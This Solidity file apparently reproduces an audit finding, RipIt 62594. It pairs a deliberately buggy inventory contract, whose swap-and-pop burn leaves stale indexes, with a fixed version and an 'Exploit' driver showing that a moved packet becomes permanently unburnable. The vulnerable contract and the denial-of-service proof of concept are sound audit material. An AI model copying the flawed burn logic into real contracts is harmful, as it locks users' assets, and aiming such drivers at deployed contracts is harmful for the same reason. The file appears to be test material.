// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of RipIt finding 62594:
// "[H-01] Missing index updates in burnPacketFromInventory() cause failures".
//
// PacketStore keeps, per packet-type, an array of packet ids (_packetInventory)
// and a reverse index (_packetInventoryIdx: packetId => position in the array).
// addPacketsToInventory pushes a new packet and records its position.
//
// burnPacketFromInventory removes a packet with a swap-and-pop: it overwrites the
// burned slot with the array's LAST element and pops the tail. BUT it never:
//   (1) updates the moved (last) packet's _packetInventoryIdx to its new slot, nor
//   (2) deletes the burned packet's stale _packetInventoryIdx entry.
//
// Consequence: after burning any non-tail packet, the packet that got moved keeps
// its OLD index (== the pre-pop last position), which now points PAST the shrunken
// array. A later burnPacketFromInventory of that moved packet reads that stale,
// out-of-bounds index and reverts with Panic(0x32) — the packet becomes
// permanently unremovable (inventory DoS). (The alternate corruption — a re-add
// colliding two packets onto one index — stems from the same missing writes.)
//
// The verbatim buggy add + swap-pop lines are inlined below (marked // @>). The
// FIXED variant applies the audit's exact two-line recommendation.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal ERC20 double used purely as a HARM MARKER: 1 unit minted to the
///      SINK records "1 packet permanently stuck / unremovable". It is not the
///      vulnerable boundary — the bug is entirely inside PacketStore.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 0;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract. The role modifier (onlyRole(INVENTORY_MANAGER_ROLE)) and
// the per-packet packetTypeId lookup are the only SNIPPED parts; packetTypeId is
// pinned to a fixed constant so a single inventory array exercises the exact bug.
// The idx-set + push (add) and the swap + pop (burn) are verbatim from the report.
// ─────────────────────────────────────────────────────────────────────────────
contract PacketStore {
    uint256 internal constant packetTypeId = 1;

    mapping(uint256 => uint256[]) internal _packetInventory;
    mapping(uint256 => uint256) internal _packetInventoryIdx;

    event PacketAddedToInventory(uint256 packetId, uint256 packetTypeId);

    function addPacketsToInventory(uint256[] calldata packetIds) external {
        uint256 length = packetIds.length;
        for (uint256 i = 0; i < length; i++) {
            uint256 packetId = packetIds[i];

            _packetInventoryIdx[packetId] = _packetInventory[packetTypeId].length;
            _packetInventory[packetTypeId].push(packetId);

            emit PacketAddedToInventory(packetId, packetTypeId);
        }
    }

    function burnPacketFromInventory(uint256 packetId) external {
        uint256 idx = _packetInventoryIdx[packetId];

        _packetInventory[packetTypeId][idx] = _packetInventory[packetTypeId][_packetInventory[packetTypeId].length - 1];
        _packetInventory[packetTypeId].pop(); // @> swap-pop removes the entry but never sets _packetInventoryIdx[movedPacket]=idx nor deletes _packetInventoryIdx[packetId] — the moved packet's index goes stale (OOB)
    }

    // --- read-only helpers for the driver's assertions (not part of the bug) ---
    function inventoryLength() external view returns (uint256) {
        return _packetInventory[packetTypeId].length;
    }

    function inventoryAt(uint256 i) external view returns (uint256) {
        return _packetInventory[packetTypeId][i];
    }

    function idxOf(uint256 packetId) external view returns (uint256) {
        return _packetInventoryIdx[packetId];
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract: the audit's exact two-line recommendation applied to burn.
// ─────────────────────────────────────────────────────────────────────────────
contract PacketStoreFixed {
    uint256 internal constant packetTypeId = 1;

    mapping(uint256 => uint256[]) internal _packetInventory;
    mapping(uint256 => uint256) internal _packetInventoryIdx;

    event PacketAddedToInventory(uint256 packetId, uint256 packetTypeId);

    function addPacketsToInventory(uint256[] calldata packetIds) external {
        uint256 length = packetIds.length;
        for (uint256 i = 0; i < length; i++) {
            uint256 packetId = packetIds[i];

            _packetInventoryIdx[packetId] = _packetInventory[packetTypeId].length;
            _packetInventory[packetTypeId].push(packetId);

            emit PacketAddedToInventory(packetId, packetTypeId);
        }
    }

    function burnPacketFromInventory(uint256 packetId) external {
        uint256 idx = _packetInventoryIdx[packetId];

        uint256 lastPacketId = _packetInventory[packetTypeId][_packetInventory[packetTypeId].length - 1];
        _packetInventory[packetTypeId][idx] = lastPacketId;

        _packetInventoryIdx[lastPacketId] = idx;   // FIX: moved packet's index -> its new slot
        delete _packetInventoryIdx[packetId];      // FIX: drop the burned packet's stale index
        _packetInventory[packetTypeId].pop();
    }

    function inventoryLength() external view returns (uint256) {
        return _packetInventory[packetTypeId].length;
    }

    function inventoryAt(uint256 i) external view returns (uint256) {
        return _packetInventory[packetTypeId][i];
    }

    function idxOf(uint256 packetId) external view returns (uint256) {
        return _packetInventoryIdx[packetId];
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: seed P1,P2,P3; burn P1 (moves P3 into slot 0 but leaves P3's
// index stale at 2); then attempt to burn the moved packet P3 — it reverts
// permanently (Panic 0x32), so P3 is unremovable inventory. The fixed variant
// removes P3 cleanly. The stuck-packet count (1) is recorded on a MARKER token
// minted to the SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    uint256 internal constant P1 = 101;
    uint256 internal constant P2 = 102;
    uint256 internal constant P3 = 103;

    // Exposed results.
    address public packetStoreAddr;
    address public fixedStoreAddr;
    address public markerAddr;

    bool public buggyBurnReverted;   // true = moved packet P3 cannot be burned (harm)
    bool public fixedBurnSucceeded;  // true = fixed variant removes P3 cleanly (control)
    uint256 public stuckPacketId;    // the permanently-unremovable packet id
    uint256 public buggyStaleIdx;    // P3's stale index in the buggy store (== 2)
    uint256 public buggyLenAfterFirstBurn; // buggy inventory length after burning P1 (== 2)
    uint256 public sinkMarkerBalance; // stuck-packet count recorded at SINK

    function run() external payable {
        // --- deploy vuln + fixed + marker (marker LAST) ---
        PacketStore store = new PacketStore();              // nonce 1
        PacketStoreFixed fixedStore = new PacketStoreFixed(); // nonce 2
        MiniToken marker = new MiniToken("Locked Packet", "LOCKED-PACKET"); // nonce 3 (LAST)

        packetStoreAddr = address(store);
        fixedStoreAddr = address(fixedStore);
        markerAddr = address(marker);

        // --- seed inventory [P1, P2, P3] on both stores via the real add path ---
        uint256[] memory ids = new uint256[](3);
        ids[0] = P1;
        ids[1] = P2;
        ids[2] = P3;
        store.addPacketsToInventory(ids);
        fixedStore.addPacketsToInventory(ids);

        // --- burn the head packet P1: swap-pops the tail (P3) into slot 0 ---
        store.burnPacketFromInventory(P1);
        fixedStore.burnPacketFromInventory(P1);

        // In the buggy store P3 was moved to slot 0 but its index still reads 2,
        // while the array shrank to length 2 -> a stale, out-of-bounds index.
        buggyStaleIdx = store.idxOf(P3);
        buggyLenAfterFirstBurn = store.inventoryLength();

        // --- HARM: burning the moved packet P3 now reverts permanently (OOB) ---
        try store.burnPacketFromInventory(P3) {
            buggyBurnReverted = false;
        } catch {
            buggyBurnReverted = true;
        }
        require(buggyBurnReverted, "harm not reproduced: buggy burn of moved packet must revert (OOB)");

        // --- CONTROL: the fixed variant removes the same moved packet cleanly ---
        try fixedStore.burnPacketFromInventory(P3) {
            fixedBurnSucceeded = true;
        } catch {
            fixedBurnSucceeded = false;
        }
        require(fixedBurnSucceeded, "control failed: fixed burn of moved packet must succeed");

        // --- record the harm magnitude: 1 permanently-stuck packet -> SINK ---
        stuckPacketId = P3;
        marker.mint(SINK, 1);
        sinkMarkerBalance = marker.balanceOf(SINK);
    }
}
